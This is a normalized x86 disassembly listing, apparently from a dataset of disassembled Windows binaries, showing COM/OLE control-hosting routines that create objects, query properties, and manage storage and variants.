lea esi [ ebp - 0x100 ]
call sub_40d9aa
mov edi [ CharNextA@IAT ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
push esi
call edi
mov esi eax
movsx eax [ esi ]
push eax
call sub_40d9aa
test eax eax
pop ecx
jne r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
push esi
call edi
mov esi eax
cmp al 0x2d
jne r-xdata
leave
retn 0xc
test eax eax
je r-xdata
mov [ ecx ] eax
movsx eax [ esi ]
push eax
call sub_40d91b
pop ecx
pop edi
mov ecx [ ebp + 0xc ]
pop esi
test ecx ecx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
push 0xa
lea eax [ ebp - 0x100 ]
push 0x0
push eax
je r-xdata
call sub_40e14a
call sub_40df2e
jmp r-xdata
add esp 0xc
sub_405bed
push ebp
mov ebp esp
sub esp 0x24
cmp [ ebp + 0x10 ] 0x0
push esi
lea eax [ ebp - 0x24 ]
push 0xa
push eax
mov esi ecx
push [ ebp + 0xc ]
je r-xdata
call sub_40e1e7
call sub_40e1bd
jmp r-xdata
mov eax [ esi ]
add esp 0xc
lea ecx [ ebp - 0x24 ]
push ecx
mov ecx esi
push [ ebp + 0x8 ]
call [ eax + 0x84 ]
pop esi
leave
retn 0xc
sub_405c45
mov eax sub_42621c
call sub_40cc20
push ecx
push ecx
mov eax [ ecx ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
call [ eax + 0x70 ]
xor ecx ecx
cmp eax ecx
jne r-xdata
cmp [ eax + 0x38 ] ecx
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
push edx
push 0x3
push ecx
mov ecx eax
call sub_41f383
mov eax [ ebp + 0x8 ]
cmp eax 0xffff
jne r-xdata
push ecx
push ecx
push 0xf0
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
push 0x1
pop eax
sub_405d0d
push ebx
mov ebx [ esp + 0x8 ]
push edi
mov eax [ ebx - 0x4 ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop ebx
retn 0xc
mov edi [ eax + 0x54 ]
push esi
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebx - 0x4 ]
test edi edi
mov [ eax + 0x54 ] esi
pop esi
je r-xdata
mov eax [ esi ]
push esi
call [ eax + 0x4 ]
mov eax [ edi ]
push edi
call [ eax + 0x8 ]
sub_405d57
mov eax sub_426230
call sub_40cc20
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
cmp [ esi + 0x20 ] edi
mov [ ebp - 0x4 ] edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_424506
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ esi + 0x2c ] edi
mov ebx [ esi + 0x24 ]
jbe r-xdata
mov eax [ ebx ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
add ebx 0x4
cmp edi [ esi + 0x2c ]
jb r-xdata
sub_405dc9
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_424554
test eax eax
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
push 0x1
pop eax
sub_405e26
mov eax sub_426245
call sub_40cc20
sub esp 0x20
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor ebx ebx
test [ ebp + 0xc ] 0x1
mov [ ebp - 0x10 ] esp
mov [ eax ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
push 0x38
call sub_41b806
mov esi eax
pop ecx
mov [ ebp - 0x28 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ esi - 0x24 ]
mov [ ebp - 0x14 ] eax
shl eax 0x2
push eax
call sub_41b806
mov [ ebp + 0x8 ] eax
mov eax [ esi - 0x24 ]
xor edi edi
pop ecx
neg eax
sbb eax eax
mov [ ebp - 0x1c ] eax
xor esi esi
jmp r-xdata
push 0x1
mov ecx esi
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
push 0x4
call sub_4244ab
mov [ esi ] r--data
jmp r-xdata
lea eax [ ebp + 0xc ]
lea ecx [ esi - 0x30 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_41ab2a
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4c ]
mov [ ecx + edi * 4 ] eax
mov eax [ ebp - 0x1c ]
inc edi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] ebx
jl r-xdata
cmp eax ebx
je r-xdata
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax [ ebp + 0x10 ]
add esi 0x34
mov [ eax ] esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
mov edi [ ebp - 0x14 ]
cmp edi ebx
jbe r-xdata
mov eax [ esi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
add esi 0x4
dec edi
jne r-xdata
sub_405eec
mov esi [ ebp - 0x20 ]
xor ebx ebx
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] ebx
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax [ ebp + 0x10 ]
add esi 0x34
mov [ eax ] esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
mov edi [ ebp - 0x14 ]
cmp edi ebx
jbe r-xdata
mov eax [ esi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
add esi 0x4
dec edi
jne r-xdata
sub_405f50
mov eax sub_426258
call sub_40cc20
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_41b33b
mov eax [ ebp + 0x8 ]
or [ esi + 0x28 ] 0xffffffff
xor edi edi
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] edi
mov [ esi + 0x1c ] eax
mov [ esi + 0x24 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
call sub_425468
mov [ esi + 0x60 ] edi
mov [ esi + 0x64 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x94 ] edi
mov [ esi + 0x98 ] edi
mov eax [ rw-data ]
mov [ esi + 0x9c ] eax
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xb8 ] r--data
mov [ esi + 0xbc ] r--data
mov [ esi + 0xc0 ] r--data
mov [ esi + 0xc4 ] r--data
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
lea ebx [ esi + 0xa8 ]
push 0x10
mov [ esi + 0xd4 ] r--data
push edi
mov [ esi + 0xd8 ] r--data
push ebx
mov [ esi ] r--data
call sub_40cc70
mov ecx [ ebp - 0xc ]
add esp 0xc
mov [ ebx ] di
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_406073
mov eax sub_426285
call sub_40cc20
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov edi [ esi + 0x88 ]
xor ebx ebx
cmp edi ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
mov ecx esi
call sub_406ee0
push [ esi + 0x60 ]
lea eax [ esi + 0x3c ]
mov ecx esi
push eax
call sub_406b5c
push [ esi + 0x64 ]
mov ecx esi
push r--data
call sub_406b5c
push [ esi + 0x84 ]
mov ecx esi
push r--data
call sub_406b5c
mov eax [ esi + 0x50 ]
cmp eax ebx
je r-xdata
mov ecx edi
call sub_407f1d
push edi
call sub_41b82f
pop ecx
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov eax [ esi + 0x50 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ esi + 0x50 ] ebx
mov eax [ esi + 0x4c ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ esi + 0x54 ] ebx
lea eax [ esi + 0xa8 ]
push eax
call [ VariantClear@IAT ]
push ebx
push 0xffffffff
mov ecx esi
call sub_407763
cmp [ esi + 0x94 ] ebx
je r-xdata
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xc ]
mov eax [ esi + 0x4c ]
push 0x1
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esi + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ esi + 0x4c ] ebx
lea ecx [ esi + 0x9c ]
mov [ ebp - 0x4 ] 0x1
call sub_41c358
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] bl
call sub_42548e
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41b355
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi + 0x90 ]
cmp eax ebx
je r-xdata
mov ecx [ eax + 0x88 ]
cmp ecx ebx
je r-xdata
mov eax [ ecx ]
push ebx
push esi
call [ eax + 0x8 ]
sub_40619f
mov eax sub_426298
call sub_40cc20
sub esp 0x1c
push esi
mov esi ecx
push edi
push 0x0
mov ecx [ esi + 0x34 ]
mov eax [ esi + 0x38 ]
sub ecx [ esi + 0x2c ]
sub eax [ esi + 0x30 ]
mov [ ebp - 0x14 ] ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
call sub_420fc0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_422232
mov eax [ esi + 0x4c ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
mov ecx [ eax ]
push eax
call [ ecx + 0x44 ]
mov edi eax
test edi edi
jl r-xdata
xor eax eax
lea ecx [ ebp - 0x28 ]
test edi edi
setge al
or [ ebp - 0x4 ] 0xffffffff
mov esi eax
call sub_421032
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi + 0x4c ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
mov ecx [ eax ]
push eax
call [ ecx + 0x48 ]
test eax eax
jl r-xdata
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x28 ]
push eax
call sub_4222c0
mov eax [ ebp - 0x14 ]
add eax [ esi + 0x2c ]
mov [ esi + 0x34 ] eax
mov eax [ esi + 0x30 ]
add eax [ ebp - 0x10 ]
mov [ esi + 0x38 ] eax
sub_406247
mov eax sub_4262ac
call sub_40cc20
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov ebx ecx
xor esi esi
cmp eax esi
mov [ ebx + 0x20 ] esi
je r-xdata
call sub_422b32
cmp [ eax + 0x114 ] esi
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ eax + 0x38 ] ebx
push edi
mov ecx ebx
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
call sub_406741
cmp eax esi
mov [ ebp + 0x8 ] eax
jl r-xdata
call sub_423dd6
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
mov eax [ ebp + 0x20 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebp + 0x1c ]
cmp eax esi
jne r-xdata
mov eax 0x80004005
jmp r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ eax ]
mov esi [ eax + 0x4 ]
lea edi [ ebx + 0x2c ]
mov eax [ ecx ]
mov ecx [ ecx + 0x4 ]
add edx eax
add esi ecx
mov [ ebp - 0x18 ] esi
lea esi [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x20 ] ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push esi
lea ecx [ ebp - 0x38 ]
call sub_420fc0
mov eax [ ebx + 0x4c ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
mov ecx [ eax ]
push eax
mov [ ebp - 0x4 ] esi
call [ ecx + 0x48 ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x38 ]
push eax
call sub_4222c0
mov ecx [ ebp + 0x18 ]
mov edx [ ebp - 0x14 ]
lea edi [ ebx + 0x2c ]
lea esi [ ebp - 0x24 ]
mov eax [ ecx ]
mov ecx [ ecx + 0x4 ]
mov [ ebp - 0x24 ] eax
add eax edx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
add eax ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] eax
or [ ebp - 0x4 ] 0xffffffff
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ecx [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
call sub_421032
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x28
test ah 0x4
je r-xdata
mov [ ebx + 0x68 ] 0x30001
mov eax [ ebx + 0x70 ]
mov [ ebx + 0x68 ] 0x30000
test ah 0x10
je r-xdata
mov eax [ ebx + 0x68 ]
and eax [ ebp + 0x14 ]
cmp [ ebp + 0x8 ] 0x1
mov [ ebx + 0x6c ] eax
je r-xdata
and [ ebp + 0x17 ] 0xef
lea eax [ ebx + 0xd4 ]
mov ecx ebx
push eax
push r--data
call sub_406af4
mov ecx ebx
mov [ ebx + 0x84 ] eax
call sub_40619f
mov eax [ ebx + 0x4c ]
lea edi [ ebx + 0x50 ]
push edi
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
xor esi esi
mov [ ebp + 0x8 ] eax
cmp eax esi
jl r-xdata
lea eax [ ebx + 0xcc ]
mov ecx ebx
push eax
lea eax [ ebx + 0x3c ]
push eax
call sub_406af4
mov [ ebx + 0x60 ] eax
lea eax [ ebx + 0xc8 ]
push eax
push r--data
mov ecx ebx
call sub_406af4
mov [ ebx + 0x64 ] eax
mov eax [ edi ]
cmp eax esi
je r-xdata
test [ ebp + 0x17 ] 0x10
je r-xdata
push [ ebx + 0x60 ]
lea eax [ ebx + 0x3c ]
mov ecx ebx
push eax
call sub_406b5c
push [ ebx + 0x64 ]
mov ecx ebx
push r--data
call sub_406b5c
push [ ebx + 0x84 ]
mov ecx ebx
push r--data
call sub_406b5c
mov eax [ ebx + 0x4c ]
mov [ ebx + 0x60 ] esi
mov [ ebx + 0x64 ] esi
mov [ ebx + 0x84 ] esi
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ ebp + 0x8 ] esi
mov [ ebx + 0x4c ] esi
jl r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ edi ] esi
mov esi [ OffsetRect@IAT ]
mov eax 0xffff8300
push eax
push eax
lea eax [ ebx + 0x2c ]
push eax
call esi
mov eax [ ebx ]
push 0x0
push 0xfffffffb
mov ecx ebx
call [ eax + 0x54 ]
test eax eax
mov [ ebp + 0x8 ] eax
jl r-xdata
mov eax [ ebx ]
push esi
push 0xfffffffb
mov ecx ebx
call [ eax + 0x54 ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov ecx ebx
call sub_406ea3
cmp [ ebp + 0x10 ] esi
je r-xdata
xor esi esi
mov eax [ ebx ]
push 0x0
push 0xfffffffd
mov ecx ebx
call [ eax + 0x54 ]
test eax eax
mov [ ebp + 0x8 ] eax
jl r-xdata
cmp [ ebp + 0x8 ] esi
jl r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebx ]
and eax 0x8800000
push esi
or eax [ ebx + 0x6c ]
mov ecx ebx
push eax
push esi
call [ edx + 0x78 ]
mov eax [ ebx ]
push [ ebp + 0x10 ]
mov ecx ebx
call [ eax + 0x80 ]
mov eax 0x7d00
push eax
push eax
lea eax [ ebx + 0x2c ]
push eax
call esi
mov ecx [ edi ]
lea eax [ ebx + 0x2c ]
push eax
push eax
mov edx [ ecx ]
push ecx
call [ edx + 0x1c ]
mov [ ebp + 0x8 ] eax
xor esi esi
mov ecx ebx
call sub_406d34
jmp r-xdata
sub_4064e4
push esi
mov esi ecx
mov ecx [ esi + 0x1c ]
push [ esi + 0x20 ]
add ecx 0x20
call sub_41aae8
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0xa0 ]
test esi esi
je r-xdata
push 0x1
pop eax
pop esi
retn
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
sub_406513
push ebp
mov ebp esp
push ecx
push esi
push edi
xor edi edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push r--data
push edi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call [ CoGetClassObject@IAT ]
mov esi eax
cmp esi edi
jl r-xdata
lea eax [ ebp + 0x1c ]
mov [ ebp + 0x1c ] edi
push eax
push r--data
push edi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call [ CoGetClassObject@IAT ]
mov esi eax
cmp esi edi
jl r-xdata
mov eax esi
pop edi
pop esi
leave
retn 0x18
push [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
push [ ebp + 0x1c ]
mov ecx [ eax ]
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push eax
call [ ecx + 0x1c ]
mov esi eax
mov eax [ ebp - 0x4 ]
push [ ebp + 0x18 ]
mov eax [ ebp + 0x1c ]
push [ ebp + 0x14 ]
mov ecx [ eax ]
push [ ebp + 0xc ]
push eax
call [ ecx + 0xc ]
mov esi eax
mov eax [ ebp + 0x1c ]
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_4065a0
mov eax sub_4262c0
call sub_40cc20
sub esp 0x70
push ebx
push esi
mov esi ecx
xor ebx ebx
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
mov eax [ esi + 0x4c ]
push edx
push r--data
push eax
mov ecx [ eax ]
mov [ ebp - 0x14 ] ebx
call [ ecx ]
test eax eax
jl r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
lea eax [ esi + 0xb8 ]
push edi
mov [ ebp - 0x78 ] eax
lea eax [ esi + 0xc8 ]
mov [ ebp - 0x70 ] eax
lea eax [ esi + 0xcc ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x7c ] 0x40
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
call sub_40b948
mov eax [ esi + 0x1c ]
mov [ ebp - 0x4 ] ebx
mov edi [ eax + 0x1c ]
mov [ ebp - 0x68 ] ebx
mov ebx r--data
add ebx 0x8
cmp ebx r--data
jl r-xdata
mov eax [ ebx ]
or [ ebp - 0x68 ] eax
mov eax [ edi ]
lea ecx [ ebp - 0x24 ]
push ecx
mov ecx edi
push [ ebx - 0x4 ]
push esi
call [ eax + 0x94 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x24 ]
push ecx
push 0xfffffd40
push esi
mov ecx edi
call [ eax + 0x94 ]
mov eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
push ecx
push 0xfffffd43
push esi
mov ecx edi
call [ eax + 0x94 ]
mov eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x60 ] eax
mov eax [ edi ]
push ecx
push 0xfffffd34
push esi
mov ecx edi
call [ eax + 0x94 ]
movsx eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
push ecx
push 0xfffffd3f
push esi
mov ecx edi
call [ eax + 0x94 ]
mov eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x50 ] eax
mov eax [ edi ]
push ecx
push 0xfffffd41
push esi
mov ecx edi
call [ eax + 0x94 ]
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x5c ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
pop edi
jge r-xdata
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x3c ]
push edx
lea edx [ ebp - 0x7c ]
mov [ ebp - 0x3c ] 0x18
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0xc ]
test eax eax
jl r-xdata
and [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x14 ] 0x1
mov [ esi + 0x70 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0x60 ] eax
mov eax [ ebp - 0x2c ]
mov [ esi + 0x64 ] eax
lea eax [ ebp - 0x24 ]
push eax
call [ VariantClear@IAT ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_406741
mov eax sub_4262d4
call sub_40cc20
sub esp 0x64
push ebx
push esi
push edi
mov esi ecx
push [ ebp + 0x14 ]
xor ebx ebx
lea edi [ esi + 0x4c ]
mov [ ebp - 0x24 ] esi
push edi
push r--data
push 0x3
push ebx
push [ ebp + 0x8 ]
call sub_406513
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
lea eax [ esi + 0x3c ]
mov ecx esi
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
call sub_406bba
mov eax [ esi ]
mov ecx esi
call [ eax + 0xbc ]
cmp eax ebx
mov [ ebp - 0x20 ] eax
jne r-xdata
mov esi [ ebp + 0xc ]
cmp esi ebx
je r-xdata
mov eax [ edi ]
lea ecx [ esi + 0x70 ]
push ecx
push 0x1
mov edx [ eax ]
push eax
call [ edx + 0x58 ]
test [ esi + 0x72 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ edi ]
add esi 0xb8
push esi
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
mov eax [ edi ]
lea edx [ ebp - 0x14 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ edi ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ edi ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jge r-xdata
cmp esi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push ebx
push ebx
push ebx
push 0x3
mov ecx esi
call [ eax + 0x50 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push 0x1
push eax
call [ ecx + 0x18 ]
mov eax [ edi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ edi ] ebx
cmp [ ebp + 0x10 ] ebx
je r-xdata
lea eax [ ebp + 0xc ]
mov [ ebp + 0xc ] ebx
push eax
push 0x1
push ebx
call [ CreateILockBytesOnHGlobal@IAT ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
push ebx
push 0x1000
push 0x1
push esi
lea ecx [ ebp - 0x70 ]
call sub_4214a4
lea eax [ ebp - 0x70 ]
lea ecx [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_41a569
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x2c ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x70 ]
mov [ ebp + 0x14 ] eax
call sub_421580
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ esi ]
lea ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp + 0x10 ]
push ecx
push 0xffffffff
push ebx
mov ecx esi
mov [ ebp + 0x10 ] ebx
call [ eax + 0x50 ]
mov ecx [ ebp + 0x8 ]
push eax
push [ ebp + 0x10 ]
mov edx [ ecx ]
push ecx
call [ edx + 0x14 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ ebp + 0x14 ] 0x8000ffff
mov eax [ esi ]
mov ecx esi
call [ eax + 0x30 ]
push eax
push ebx
mov [ ebp + 0xc ] eax
call [ GlobalAlloc@IAT ]
cmp eax ebx
mov [ ebp + 0x10 ] eax
je r-xdata
mov eax [ ebp - 0x14 ]
lea eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
push eax
push ebx
push 0x1012
push [ ebp + 0xc ]
call [ StgCreateDocfileOnILockBytes@IAT ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jl r-xdata
mov eax [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] ebx
jl r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x8007000e
mov [ ebp + 0x10 ] ebx
push eax
call [ GlobalLock@IAT ]
cmp eax ebx
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ ebp - 0x14 ]
push [ ebp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ ebp + 0x14 ] 0x1
mov ecx [ ebp - 0x24 ]
test [ ecx + 0x72 ] 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push [ ebp + 0x10 ]
call [ CreateILockBytesOnHGlobal@IAT ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
push [ ebp + 0xc ]
mov edx [ esi ]
mov ecx esi
push eax
call [ edx + 0x34 ]
push [ ebp + 0x10 ]
call [ GlobalUnlock@IAT ]
jmp r-xdata
mov eax [ edi ]
add ecx 0xb8
push ecx
push eax
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp + 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x18 ] ebx
push eax
push ebx
push ebx
push 0x12
push ebx
push [ ebp - 0x1c ]
call [ StgOpenStorageOnILockBytes@IAT ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
cmp [ ebp + 0x10 ] ebx
mov [ ebp - 0x1c ] ebx
je r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
push [ ebp - 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
sub_406a4f
push esi
lea esi [ ecx + 0x2c ]
mov eax [ ecx + 0x4c ]
push esi
mov esi [ ecx + 0x1c ]
add ecx 0xb8
mov edx [ eax ]
mov esi [ esi + 0x1c ]
push [ esi + 0x1c ]
push 0x0
push ecx
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push eax
call [ edx + 0x2c ]
pop esi
retn 0x8
sub_406aa4
push ebp
mov ebp esp
test [ ecx + 0x71 ] 0x10
je r-xdata
pop ebp
retn 0x4
mov eax [ ecx + 0x6c ]
mov edx eax
and edx 0x1
